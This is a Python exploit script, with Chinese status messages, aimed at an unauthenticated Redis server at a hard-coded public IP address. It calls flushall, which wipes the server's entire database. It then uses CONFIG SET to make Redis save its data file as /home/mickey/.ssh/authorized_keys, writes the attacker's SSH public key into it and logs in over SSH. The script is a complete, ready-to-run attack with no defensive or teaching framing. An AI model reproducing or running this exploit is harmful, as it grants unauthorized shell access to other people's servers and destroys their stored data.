#!/usr/bin/python
# coding: utf-8

import os
KEY_PATH = os.path.expanduser('~/.ssh/id_rsa')
if not os.path.isfile(KEY_PATH) or not os.path.isfile(KEY_PATH + '.pub'):
    print('本地没有密钥对。生成……')
    os.system('ssh-keygen -f ~/.ssh/id_rsa -N ""')

pub_key = open(KEY_PATH + '.pub').read()

host = '121.201.8.217'
import redis
r = redis.Redis(host = host, port = 7963, db = 0)
r.flushall()
r.config_set('dir', '/home/mickey/.ssh/')
r.config_set('dbfilename', 'authorized_keys')
r.set('xxxx', '\n\n\n{}\n\n'.format(pub_key))
print(r.keys())
r.save()
print(r.get('xxxx'))
print('现在你可以执行 \nssh {}'.format(host))
os.system('ssh -v {}'.format(host))
